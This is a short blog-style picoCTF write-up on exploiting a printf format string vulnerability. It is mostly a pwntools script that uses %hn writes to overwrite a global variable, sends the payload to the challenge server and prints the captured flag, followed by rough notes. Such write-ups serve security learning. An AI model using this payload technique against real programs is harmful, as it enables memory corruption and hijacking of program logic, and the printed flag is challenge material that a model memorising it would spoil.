---
layout: post
title:  "Overwriting Variables Using C’s Printf() Vulnerability to Hijack Conditions"
description: Abusing C’s printf functions in programs to over-write variables to values of our choosing.
date:   2024-10-29
tags: ["Medium", "Buffer Overflow", "Binary Exploitation", "pwn", "binex"]
category: [CTF,picoCTF]
comments: true
---

{: .prompt-info }
> **Provided By**
> [alimuhammadsecured](https://medium.com/@alimuhammadsecured/) <- visit their writeups!


## Understanding chall.c

The code for your convenience:
```python
from pwn import*

'''
second 2 bytes  first 2 bytes 
[ 67 61 ]       [6c 66] 
ok so we split it into 2 sections of two bytes each.
Now we're going to show the representation of each of these numbers in decimal since that's how we write using %n.
6761 = 26465
6c66 = 27750
'''

# 27750 - 26465 = 1285 bytes left to write

address_of_sus_global_var = 0x404060
little_endian_second_two_bytes = p64( address_of_sus_global_var + 2 )
little_endian_base_first_two_bytes = p64( address_of_sus_global_var )

#          (14)            (15)          (16)          (17)          (18)                                (19)
payload = b"%026465x" + b"%0018$hn" + b"%001285x" + b"%0019$hn" + little_endian_second_two_bytes + little_endian_base_first_two_bytes

# setup the connection
HOST = "rhea.picoctf.net"
PORT = 52318
pipe = remote( HOST, PORT )
pipe.sendline(payload)
pipe.interactive()

# FLAG: picoCTF{f0rm47_57r?_f0rm47_m3m_5161a699}


'''

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


- The sus variable is stored in smt known as the data segment because it is not in the main() function,
    Anthony said that we need to look at PIE (since it is not enabled this will help us).

********
- Moreover, our data is stored in the stack, we need to use %n, but how will
    we write to sus if out input is in the stack?
        - apparantely %n does not just write to stack but a specific
        place in memory relatively to characters printed or smt.
        so global variables are stored in a fix position if PIE is not enabled, that's a good start.

        
'''


```


## Vulnerabilities
There's several vulnerabilities to note:
- The `printf()` unsanitized format strings can be executed to overwrite data, leak data off the stack, etc.


## Solution
- visit the writeups link at the top.